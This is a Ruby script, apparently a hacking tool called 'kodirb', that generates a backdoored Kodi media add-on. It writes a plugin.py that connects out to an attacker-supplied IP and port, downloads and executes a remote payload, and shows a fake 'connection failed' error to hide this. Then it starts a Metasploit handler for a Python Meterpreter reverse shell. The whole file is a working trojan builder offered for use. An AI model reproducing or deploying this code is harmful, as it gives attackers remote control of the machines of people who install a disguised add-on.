require 'optparse'
require './utils/cores'
#require 'rubygems'
#require 'zip'


def banner()
    a = %Q(
        #    #                               
        #   #   ####  #####  # #####  #####  
        #  #   #    # #    # # #    # #    # 
        ###    #    # #    # # #    # #####  
        #  #   #    # #    # # #####  #    # 
        #   #  #    # #    # # #   #  #    # 
        #    #  ####  #####  # #    # #####  
        by: Vltz        
    )
    puts "#{a}"
end



def new_dir_root(path)

    begin
        Dir.mkdir(path, 0755)
        puts "[*] Created sucessfully".green
        if Dir.exist?(path)
            puts "[*] Directory already exist".green
        end
    rescue
        #puts "Error, Permisson Deny".red
    end
end

def create_xml(addon_id, addon_name, addon_desc, folder)
    arquivo = File.open("#{folder}/xml_addon.xml", 'w')
    arquivo.write("<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>
    <addon id=\"#{addon_id}\" name=\"#{addon_name}\" version=\"1.0.0\" provider-name=\"vltz\">
        <requires>
            <import addon=\"xbmc.python\"version=\"2.14.0\"/>
        </requires>
        <extension point=\"xbmc.python.script\"library=\"addon.py\">
            <provides> executable </provides>
        </extension>
        <extension point=\"xbmc.addon.metadata\"\>
            <platform> all </platform>
            <summary lang=\"en\"> #{addon_name} </summary>
            <description lang=\"en\"> #{addon_desc} </description>
            <license> GNU General Public License, v2 </license>
            <language></language>
            <email>webmaster@localhost</email>
            <assets>
                <icon>resources/icon.png</icon>
                <fanart>resources/fanart.jpg</fanart>
            </assets>
            <news> #{addon_desc} </news>
        </extension>
    </addon>")
end

def addon(ip, port, folder)
    port.to_i
    arquivo = File.open("#{folder}/plugin.py", "w")
    arquivo.write(" 
    import xbmcaddon
    import xbmcgui
    import socket,struct
    addon       = xbmcaddon.Addon()
    addonname   = addon.getAddonInfo('name')
    line1 = 'Error!'
    line2 = 'An error occurred'
    line3 = 'Connection to server failed... please try again later'
    s=socket.socket(2,1)
    s.connect((#{ip}, #{port}))
    l=struct.unpack('>I',s.recv(4))[0]
    d=s.recv(4096)
    while len(d)!=l:
        d+=s.recv(4096)
    exec(d,{'s':s})
    xbmcgui.Dialog().ok(addonname, line1, line2, line3)")
end

def bundle_folder(folder)
    puts "Zipping..".red

    input_filenames = Dir.entries(folder)
    zipfile_name = folder + "/zip.zip"

    Zip::File.open(zipfile_name, Zip::File::CREATE) do |zipfile|
        input_filenames.each do |filename|
          zipfile.add(filename, folder + '/' + filename)
        end
    end
end




options = {:key => nil, :search => nil}
  parser = OptionParser.new do|opts|
    banner()
      opts.banner = "\n ruby kodirb.rb -n <any_name> -s <kodi.wth.aa> -d <description of addon> -i <ip> -p <port> \n".red

      opts.on("-n n", '--name=', 'Name') do |names|
          options[:names] = names;
      end

      opts.on("-s n", '--id=', 'id') do |ids|
          options[:ids] = ids;
      end

      opts.on("-d n", '--description=', 'description about plugin') do |descr|
        options[:descr] = descr;
      end

      opts.on("-ip n", '--ip=', 'ip of your VPS/MACHINE/..') do |ip|
        options[:ip] = ip;
      end

      opts.on("-p n", '--port=', 'port of your backdoor') do |ports|
        options[:ports] = ports;
      end 

      opts.on('-h', '--help', 'Displays Help') do
          puts opts
          exit
      end

      if options[:descr].nil?
        puts opts
      elsif options[:ports].nil?
        puts opts
      elsif options[:ip].nil?
        puts opts
      elsif options[:ids].nil?
        puts opts
      elsif options[:names].nil?
        puts opts
      end
  end  
  parser.parse!

  #get values from input
  $ip = options[:ip]
  $port = options[:ports]
  $descr = options[:descr]
  $names = options[:names]
  $ids = options[:ids]


  if $ip.nil? or $port.nil? or $descr.nil? or $names.nil? or $ids.nil?
        puts "\n\nALL FLAGS ARE REQUIRED !! \n".red
  else
        puts "\n\nType where your want to create your folder: \n\n".red
    folder = gets.chomp()
    #INIT
    new_dir_root(folder)
        sleep(2)
    create_xml($id, $names, $descr, folder)
        puts "[*] Created a XML !".magenta
        sleep(2)
    addon($ip, $port, folder)
        puts "[*] Created a Addon Backdoor !".magenta
        sleep(2)
    #bundle_folder(folder)
    #TODO
    puts "ZIP the Files generated...".cyan
    puts "\n\n"
    puts "LOADING METERPRETER....".green
    sleep(2)
    system("./msfconsole -x use multi/handler; set LHOST #{$ip} set LPORT #{$port} set PAYLOAD python/meterpreter/reverse_tcp exploit")

  end

  



